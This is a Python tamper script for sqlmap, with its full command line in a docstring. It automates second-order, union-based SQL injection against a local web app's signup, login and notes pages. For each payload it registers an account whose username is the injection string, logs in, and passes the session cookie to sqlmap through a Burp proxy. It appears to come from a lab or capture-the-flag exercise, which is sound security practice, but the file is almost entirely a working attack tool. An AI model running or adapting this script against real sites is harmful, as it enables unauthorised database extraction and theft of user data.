#!/usr/bin/python
import requests
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
"""
sqlmap --tamper so-tamper.py -r register.req --second-url http://127.0.0.1:5000/notes -p username --dbms sqlite --proxy http://127.0.0.1:8080 --technique=U

--tamper so-tamper.py - The tamper script
-r register.req - Request from Burp. Makes sure that the password is the same as in the tamper script
--second-url http://127.0.0.1:5000/notes - Visit this URL to check for results
-p username - The parameter to inject to
--dbms sqlite - To speed things up
--proxy http://127.0.0.1:8080 - Can be used to analyze requests with Burp
--technique=U - The technique to use. [U]nion-based
"""
def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": "asd"}
        proxies = {"http": "http://127.0.0.1:8080"}
        resp = s.post("http://127.0.0.1:5000/signup", data=data, proxies=proxies)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": "asd"}
        proxies = {"http": "http://127.0.0.1:8080"}
        resp = s.post("http://127.0.0.1:5000/login", data=data, proxies=proxies)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload

if __name__ == "__main__":
    login("test")